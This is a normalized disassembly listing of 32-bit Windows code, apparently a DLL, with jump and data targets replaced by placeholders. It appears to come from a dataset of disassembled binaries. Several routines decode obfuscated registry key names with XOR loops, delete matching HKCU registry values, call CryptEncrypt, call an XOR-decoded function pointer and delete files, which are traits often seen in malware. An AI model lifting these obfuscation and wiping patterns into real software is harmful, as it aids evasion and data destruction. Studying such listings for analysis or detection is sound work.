lea eax [ ebp - 0x4 ]
push eax
push ebx
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0xc ]
call [ CryptImportKey@IAT ]
test eax eax
jne r-xdata
inc eax
mov eax [ ebp + 0xc ]
push [ eax ]
mov esi [ ebp + 0x8 ]
mov edi [ CryptEncrypt@IAT ]
lea eax [ ebp - 0x8 ]
push eax
push [ esi ]
push ebx
push 0x1
push ebx
push [ ebp - 0x4 ]
call edi
test eax eax
jne r-xdata
push 0x2
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp - 0x4 ]
mov [ ecx ] eax
call [ CryptDestroyKey@IAT ]
xor esi esi
jmp r-xdata
call [ GetLastError@IAT ]
cmp eax 0xea
jne r-xdata
pop ebx
leave
retn 0x10
push ebx
push [ ebp - 0xc ]
call [ CryptReleaseContext@IAT ]
pop edi
mov eax esi
pop esi
jmp r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x3
jmp r-xdata
push [ ebp - 0x8 ]
push [ esi ]
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapReAlloc@IAT ]
push [ ebp - 0x8 ]
mov [ esi ] eax
push [ ebp + 0xc ]
push eax
push ebx
push 0x1
push ebx
push [ ebp - 0x4 ]
call edi
test eax eax
jne r-xdata
pop esi
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x4
jmp r-xdata
sub_10022b70
push ebp
mov ebp esp
push 0xffffffff
push sub_10087ba9
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x10 ] 0x0
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov edx [ ecx + 0x10 ]
mov [ ebp - 0x10 ] 0x1
lea edi [ eax + 0x2 ]
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edi
mov edi [ esi + 0x10 ]
sar eax 0x1
add eax edx
cmp edi eax
ja r-xdata
mov eax [ ebp + 0xc ]
push 0xffffffff
push 0x0
push eax
mov ecx esi
call sub_10017b50
mov edi [ ebp + 0x10 ]
mov eax edi
lea edx [ eax + 0x2 ]
cmp [ esi + 0x14 ] eax
je r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push edi
mov ecx esi
call sub_10040ba0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
push 0x1
push eax
mov ecx esi
call sub_10070030
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
xor edx edx
mov [ eax + edi * 2 ] dx
sub_10022c7d
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1001da0a
push [ ebp + 0x18 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10082f16
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10022cc0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi ecx
push eax
lea esi [ edi + 0x8 ]
push esi
lea ecx [ ebp + 0x8 ]
mov [ edi + 0x4 ] eax
call sub_1004d4b0
push eax
mov ecx esi
call sub_1004c5f0
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
mov [ edi + 0x4c ] 0x0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_10034e98
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov esi [ ebx + 0x4 ]
neg esi
sbb esi esi
not esi
lea ecx [ ebp - 0x4 ]
and esi ebx
call sub_10069747
xor ebx ebx
cmp esi ebx
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov [ edi + 0x4c ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ ebx + 0x4 ] eax
sub_10022d44
mov edi edi
push ebp
mov ebp esp
mov eax 0xe06d7363
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0xc ]
push eax
call sub_1005b5bd
pop ecx
pop ecx
pop ebp
retn
sub_10022d70
push ebp
mov ebp esp
push 0xffffffff
push sub_10087f9b
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov [ edi + ecx ] r--data
mov edx [ edi ]
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] ebx
mov esi [ edx + 0x4 ]
add esi edi
call sub_1000fe50
mov eax [ ebp + 0xc ]
mov ecx esi
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] ebx
call sub_10054f70
mov [ esi + 0x40 ] al
cmp [ esi + 0x38 ] ebx
jne r-xdata
mov ecx [ edi + 0x10 ]
mov edx [ ecx + 0x4 ]
mov [ edi + edx + 0x10 ] r--data
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov [ edi + ecx ] r--data
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ esi + 0xc ]
or eax 0x4
or eax 0x4
push ebx
mov ecx esi
call sub_1001bdc0
sub_10022e20
push ebp
mov ebp esp
push 0xffffffff
push sub_10087fc0
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov eax [ ecx + edi + 0xc ]
add ecx edi
test eax eax
jne r-xdata
mov eax [ ecx + 0xc ]
or eax 0x2
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x3c ]
test ecx ecx
je r-xdata
push 0x0
call sub_1001bdc0
xor al al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
or eax 0x4
mov edx [ edi ]
mov ecx [ edx + 0x4 ]
add ecx edi
cmp [ ecx + 0xc ] 0x0
jne r-xdata
mov esi ecx
call sub_1004ef40
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_10022eb0
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10054c70
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
add esp 0x4
sub_10022ee0
push ebp
mov ebp esp
push 0xffffffff
push sub_1008620b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0xc
call sub_1001f84c
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0x8 ]
push eax
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x1
call sub_10028ac0
mov [ esi ] eax
jmp r-xdata
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push 0x8007000e
call sub_10035950
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebx ] esi
test esi esi
jne r-xdata
sub_10022f66
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x20 ] 0x0
push edi
mov ebx rw-data
je r-xdata
mov edi ebx
push 0x164
push 0x1
call sub_10067d3a
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
mov [ esi + 0xd4 ] edi
xor eax eax
add eax 0xb4
push eax
call [ InterlockedDecrement@IAT ]
mov eax esi
mov ecx edi
call sub_10082494
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ edi + 0xb4 ] 0x1
jmp r-xdata
push edi
call sub_10066af4
push edi
call sub_10035d06
pop ecx
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0xd4 ]
cmp eax ebx
je r-xdata
sub_10022fe3
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x10 ]
fld [ ebp + 0x8 ]
movzx ecx [ ebp + 0xe ]
fstp [ ebp - 0x8 ]
add eax 0x3fe
shl eax 0x4
and ecx 0x800f
or eax ecx
mov [ ebp - 0x2 ] ax
fld [ ebp - 0x8 ]
leave
retn
sub_10023010
push esi
mov esi eax
mov eax [ edi + 0x4 ]
cmp esi eax
jae r-xdata
cmp eax [ edi + 0x8 ]
jne r-xdata
mov ecx [ edi ]
cmp ecx esi
ja r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov ecx edi
call sub_1005b9f0
sub esi ecx
sar esi 0x3
cmp eax [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x8
pop esi
retn
mov ecx [ esi ]
mov [ eax ] ecx
mov edx [ esi + 0x4 ]
mov [ eax + 0x4 ] edx
mov ecx [ edi + 0x4 ]
test ecx ecx
je r-xdata
mov ecx edi
call sub_1005b9f0
mov eax [ edi ]
mov edx [ eax + esi * 8 ]
mov [ ecx ] edx
mov eax [ eax + esi * 8 + 0x4 ]
mov [ ecx + 0x4 ] eax
add [ edi + 0x4 ] 0x8
pop esi
retn
sub_1002306f
push 0x10
push r--data
call sub_1007fb20
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_10058c10
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10023102
mov eax [ ebp - 0x1c ]
call sub_1007fb65
retn
mov esi edi
mov eax [ rw-data ]
cmp [ eax + esi * 4 ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_100100f2
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_10035d06
pop ecx
mov eax [ rw-data ]
mov [ eax + esi * 4 ] ebx
inc [ ebp - 0x1c ]
sub_10023120
push ebp
mov ebp esp
push 0xffffffff
push sub_10086eb0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx ecx
xor edi edi
push 0x10
mov [ ebp - 0x4 ] edi
call sub_1001f84c
add esp 0x4
cmp eax edi
je r-xdata
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
mov ecx 0x1
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
mov edi eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4 ] edi
mov [ ebx ] eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ esi + 0x4 ]
or eax 0xffffffff
[ edx ] eax
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
sub_100231e0
push ebp
mov ebp esp
push esi
push edi
mov edi eax
lea eax [ edi - 0x1 ]
cdq
sub eax edx
mov esi eax
sar esi 0x1
cmp [ ebp + 0x8 ] edi
jge r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov [ ebx + edi * 4 ] ecx
pop edi
pop esi
pop ebp
retn
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov edx [ ebx + esi * 4 ]
push ecx
push edx
call [ ebp + 0x10 ]
add esp 0x8
test eax eax
je r-xdata
mov edx [ ebp + 0xc ]
mov eax [ edx ]
mov [ ebx + edi * 4 ] eax
pop edi
pop esi
pop ebp
retn
mov eax [ ebx + esi * 4 ]
mov [ ebx + edi * 4 ] eax
lea eax [ esi - 0x1 ]
cdq
sub eax edx
mov edi esi
sar eax 0x1
mov esi eax
cmp [ ebp + 0x8 ] edi
jl r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
mov [ ebx + edi * 4 ] edx
pop edi
pop esi
pop ebp
retn
sub_10023250
push ebp
mov ebp esp
mov [ edx ] 0x0
push esi
lea ebx [ ebx ]
mov [ edi ] eax
mov eax [ eax * 4 + rw-data ]
mov [ ecx * 4 + rw-data ] eax
mov eax [ edi ]
inc ecx
mov [ ebx ] esi
mov [ eax * 4 + rw-data ] esi
mov [ edx ] ecx
cmp ecx 0x100
jl r-xdata
dec eax
or eax 0xffffff00
inc eax
mov ecx [ edx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + ecx * 4 ]
add eax [ edi ]
mov esi [ ecx * 4 + rw-data ]
add eax esi
and eax 0x800000ff
jns r-xdata
pop esi
pop ebp
retn
sub_100232aa
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push 0x90
xor ebx ebx
push ebx
push edi
call sub_1007f940
mov esi [ ebp + 0xc ]
mov al [ esi ]
add esp 0xc
test al al
jne r-xdata
cmp al 0x2e
jne r-xdata
xor eax eax
jmp r-xdata
push r--data
push esi
mov [ ebp + 0xc ] ebx
call sub_1007f580
cmp eax ebx
jmp r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] bl
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
pop ecx
pop ecx
jne r-xdata
push 0xf
push eax
lea eax [ edi + 0x80 ]
push 0x10
push eax
call sub_10069c0f
add esp 0x10
test eax eax
jne r-xdata
cmp [ ebp + 0xc ] 0x0
lea edi [ eax + esi ]
mov bl [ edi ]
jne r-xdata
or eax 0xffffffff
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ edi + 0x8f ] bl
jmp r-xdata
cmp [ ebp + 0xc ] 0x1
jne r-xdata
cmp eax 0x40
jae r-xdata
cmp [ ebp + 0xc ] 0x2
jne r-xdata
cmp eax 0x40
jae r-xdata
cmp bl 0x2e
je r-xdata
cmp eax 0x10
jae r-xdata
cmp bl 0x5f
je r-xdata
push eax
push esi
push 0x40
push [ ebp + 0x8 ]
jmp r-xdata
test bl bl
je r-xdata
push eax
mov eax [ ebp + 0x8 ]
push esi
push 0x40
add eax 0x40
jmp r-xdata
call sub_10069c0f
add esp 0x10
test eax eax
jne r-xdata
push eax
mov eax [ ebp + 0x8 ]
push esi
push 0x10
sub eax 0xffffff80
cmp bl 0x2c
jne r-xdata
push eax
xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
cmp bl 0x2c
je r-xdata
call sub_1003cbb0
test bl bl
je r-xdata
inc [ ebp + 0xc ]
lea esi [ edi + 0x1 ]
push r--data
push esi
call sub_1007f580
test eax eax
sub_100233d0
push ebp
mov ebp esp
sub esp 0x5c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
push edi
lea esp [ esp ]
movsx edi [ ecx + eax ]
xor edi eax
xor edi 0xffa7
and edi 0xff
mov [ ebp + eax * 2 - 0x58 ] di
inc eax
cmp eax 0x28
jb r-xdata
lea ecx [ ebp - 0x5c ]
push ecx
xor eax eax
push 0x1
push eax
mov [ ebp - 0x8 ] ax
lea eax [ ebp - 0x58 ]
push eax
push edx
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
mov edi [ GetProcessHeap@IAT ]
push 0x206
push 0x8
mov [ esi ] 0x206
call edi
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp - 0x5c ]
push esi
push eax
push 0x0
push 0x0
push r--data
push ecx
mov [ ebx ] eax
call [ RegQueryValueExW@IAT ]
test eax eax
je r-xdata
mov eax 0x1
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x5c ]
push ecx
call [ RegCloseKey@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop edi
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov edx [ ebx ]
push edx
push 0x0
call edi
push eax
call [ HeapFree@IAT ]
mov eax [ ebp - 0x5c ]
push eax
call [ RegCloseKey@IAT ]
mov eax 0x2
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_100234c0
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + r--data ]
xor cl cl
cmp [ eax + 0x4 ] 0x0
jbe r-xdata
mov ecx [ eax + 0x4 ]
mov [ edi + ecx ] 0x0
retn
push esi
xor esi esi
mov edx [ eax ]
mov dl [ edx + esi ]
xor dl [ eax + 0x8 ]
xor dl cl
inc cl
mov [ esi + edi ] dl
movzx esi cl
cmp esi [ eax + 0x4 ]
jb r-xdata
mov eax [ eax + 0x4 ]
mov [ edi + eax ] 0x0
pop esi
retn
sub_10023520
push ebp
mov ebp esp
sub esp 0x47c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
push esi
xor esi esi
mov [ ebp - 0x478 ] eax
mov [ ebp - 0x470 ] esi
xor eax eax
lea ecx [ ecx ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffb7
and edx 0xff
mov [ ebp + eax * 2 - 0x60 ] dx
inc eax
cmp eax 0x2d
jb r-xdata
lea ecx [ ebp - 0x46c ]
push ecx
push 0x2011b
push esi
lea edx [ ebp - 0x60 ]
push edx
xor eax eax
push 0x80000001
mov [ ebp - 0x6 ] ax
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x46c ]
push esi
push esi
push esi
push esi
lea eax [ ebp - 0x470 ]
push eax
push esi
push esi
push esi
push esi
push esi
push esi
push ecx
call [ RegQueryInfoKeyW@IAT ]
test eax eax
je r-xdata
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x470 ] esi
jbe r-xdata
mov edx [ ebp - 0x46c ]
push edx
call [ RegCloseKey@IAT ]
mov eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x46c ]
push eax
call [ RegCloseKey@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_10001e8b
mov esp ebp
pop ebp
retn
push edi
mov edi [ RegEnumValueW@IAT ]
lea ecx [ ecx ]
inc esi
cmp esi [ ebp - 0x470 ]
jb r-xdata
mov edx [ ebp - 0x478 ]
push edx
lea eax [ ebp - 0x268 ]
push eax
call [ StrStrW@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x47c ]
push eax
lea ecx [ ebp - 0x268 ]
push ecx
mov ecx [ ebp - 0x46c ]
push 0x0
push 0x0
lea edx [ ebp - 0x474 ]
push edx
lea eax [ ebp - 0x468 ]
push eax
push esi
push ecx
mov [ ebp - 0x474 ] 0xff
mov [ ebp - 0x47c ] 0x208
call edi
test eax eax
jne r-xdata
pop edi
mov edx [ ebp - 0x46c ]
lea ecx [ ebp - 0x468 ]
push ecx
push edx
call [ RegDeleteValueW@IAT ]
sub_10023696
push 0x4
mov eax sub_10085139
call sub_100624bc
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_10034e98
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0xc ]
jmp r-xdata
test esi esi
jne r-xdata
mov eax [ edi + 0x8 ]
dec esi
lea eax [ eax + esi * 4 ]
cmp [ eax ] 0x0
je r-xdata
push [ edi + 0x8 ]
call sub_10035d06
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x10 ]
call sub_10069747
call sub_10013ab8
retn
mov ecx [ eax ]
call sub_1000ff00
test eax eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_10023700
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
push edi
mov edi [ ecx + 0x8 ]
mov esi [ edi + 0xc ]
cmp esi [ r--data ]
je r-xdata
mov eax [ edi + 0x1c ]
xor edx edx
push ebx
cmp eax edx
je r-xdata
mov eax [ ebp + 0xc ]
push ecx
mov [ edi + 0x4 ] 0x1
call sub_100795c0
mov [ edi + 0x4 ] 0x0
mov eax [ r--data ]
add esp 0x4
mov [ edi + 0xc ] eax
pop edi
mov eax 0x1
pop esi
pop ebp
retn
lea ebx [ edi + 0x94 ]
push ebx
mov [ edi + 0x1c ] edx
call sub_100194e0
mov ecx [ edi ]
push ecx
mov esi eax
push esi
push r--data
call sub_10020200
mov eax [ ebp + 0xc ]
mov edx [ edi ]
mov ecx [ ebp + 0x8 ]
mov edx [ edx * 4 + rw-data ]
push eax
push esi
push edi
push ecx
call edx
xor ecx ecx
add esp 0x20
cmp [ edi + 0x4 ] ecx
mov [ edi + 0x4 ] 0x0
sete cl
cmp eax 0x1
je r-xdata
mov esi [ edi + 0x14 ]
add esi [ edi + 0x10 ]
cmp eax esi
jae r-xdata
pop ebx
pop edi
mov eax 0x1
pop esi
pop ebp
retn
test eax eax
je r-xdata
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] edx
movsx esi [ eax ]
mov eax [ ebp + 0xc ]
push ecx
call sub_100795c0
add esp 0x4
mov [ edi + 0x4 ] ebx
mov eax 0x1
add [ edi + 0x1c ] eax
pop ebx
pop edi
pop esi
pop ebp
retn
pop ebx
pop edi
xor eax eax
pop esi
pop ebp
retn
test ecx ecx
je r-xdata
push ebx
call sub_100194e0
mov esi eax
mov eax [ edi ]
push eax
push esi
push r--data
call sub_10020200
mov edx [ ebp + 0xc ]
mov ecx [ edi ]
mov eax [ ebp + 0x8 ]
mov ecx [ ecx * 4 + rw-data ]
push edx
push esi
push edi
push eax
call ecx
xor ecx ecx
add esp 0x20
cmp [ edi + 0x4 ] ecx
mov [ edi + 0x4 ] 0x0
sete cl
cmp eax 0x1
jne r-xdata
push ebx
call sub_100428b0
add esp 0x4
sub_10023830
push ebp
mov ebp esp
sub esp 0x8
push ebx
push edi
mov ebx 0xfffffffc
lea ecx [ ecx ]
mov edi [ esi + 0x18 ]
cmp edi [ esi + 0x1c ]
je r-xdata
lea ebx [ ebx ]
mov ecx [ esi + 0x1c ]
mov eax [ esi + 0x18 ]
cmp eax ecx
je r-xdata
mov edx [ edi + 0x1c ]
push edx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
add edi 0x24
cmp edi [ esi + 0x1c ]
jne r-xdata
mov ecx [ edi ]
test ecx ecx
je r-xdata
cmp eax 0x6
je r-xdata
cmp [ esi + 0x14 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
push edx
push ecx
call sub_10059390
mov ebx [ esi + 0x1c ]
add esp 0x8
mov [ ebp - 0x4 ] eax
mov edi eax
cmp eax ebx
je r-xdata
mov ecx [ esi + 0x8 ]
lea eax [ edi + 0x4 ]
sub ecx eax
sar ecx 0x2
add ecx ecx
add ecx ecx
push ecx
push eax
push edi
call sub_1007ec90
add esp 0xc
add [ esi + 0x8 ] ebx
jmp r-xdata
mov edx [ ecx ]
mov eax [ edx + 0xc ]
push 0x1
call eax
add edi 0x4
cmp edi ecx
jne r-xdata
pop edi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x14 ]
mov edi [ eax ]
mov ebx [ eax + 0x4 ]
test edi edi
je r-xdata
mov [ esi + 0x1c ] eax
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov edi [ esi + 0x4 ]
mov ecx [ esi + 0x8 ]
cmp edi ecx
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x48 ]
cmp eax 0x4
je r-xdata
mov edx [ esi + 0x14 ]
push edx
call [ LocalFree@IAT ]
mov [ esi + 0x14 ] ebx
test ebx ebx
jne r-xdata
push edi
call sub_10039ba0
push edi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor ecx ecx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
mov [ edi ] cx
add edi 0x24
cmp edi ebx
jne r-xdata
mov eax [ edi ]
push eax
call sub_100187af
mov eax [ ebp - 0x4 ]
add esp 0x4
sub_10023965
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x14 ]
push edi
push [ ebp + 0x1c ]
mov edi [ ebp + 0x8 ]
push eax
push r--data
lea eax [ ebp - 0xc ]
mov ebx ecx
push eax
push ebx
call sub_1005efca
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_1005c1c5
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_1001caa1
mov ecx [ ebp - 0x4 ]
add esp 0x30
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn 0x18
sub_100239e0
push ebp
mov ebp esp
push ecx
push edi
mov edi ecx
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax [ edi ]
mov edx [ eax + 0x8 ]
push ebx
call edx
cmp [ edi + 0x8 ] 0x0
je r-xdata
xor eax eax
pop edi
mov esp ebp
pop ebp
retn
mov ebx [ DeleteFileW@IAT ]
mov eax [ edi ]
mov edx [ eax ]
mov ecx edi
call edx
cmp [ edi + 0x84 ] 0x8
lea eax [ edi + 0x70 ]
jb r-xdata
push esi
mov esi [ edi + 0xb4 ]
cmp esi [ edi + 0xb8 ]
je r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x4 ] ecx
mov cl 0x38
xor [ ebp - 0x4 ] cl
xor [ ebp - 0x3 ] cl
xor [ ebp - 0x2 ] cl
xor [ ebp - 0x1 ] cl
push eax
call [ ebp - 0x4 ]
mov [ edi + 0xb0 ] 0x0
mov ebx [ DeleteFileW@IAT ]
push eax
call ebx
jmp r-xdata
mov eax [ eax ]
mov eax [ edi + 0xb4 ]
mov ecx [ edi + 0xb8 ]
cmp eax ecx
je r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
add edi 0x94
cmp [ edi + 0x14 ] 0x8
pop esi
jb r-xdata
mov edx [ ebp - 0x4 ]
push edx
push ecx
call sub_1003e8a0
mov ebx [ edi + 0xb8 ]
add esp 0x8
mov [ ebp - 0x4 ] eax
mov esi eax
cmp eax ebx
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
push edi
call ebx
pop ebx
pop edi
mov esp ebp
pop ebp
retn
mov edi [ edi ]
mov ebx [ DeleteFileW@IAT ]
mov [ edi + 0xb8 ] eax
lea ecx [ ecx ]
push eax
call ebx
add esi 0x1c
cmp esi [ edi + 0xb8 ]
jne r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x1c
cmp esi ebx
jne r-xdata
mov eax [ esi ]
push eax
call sub_100187af
mov eax [ ebp - 0x4 ]
add esp 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
sub_10023b02
push 0x38
mov eax sub_1008581d
call sub_1003fae8
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10013950
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
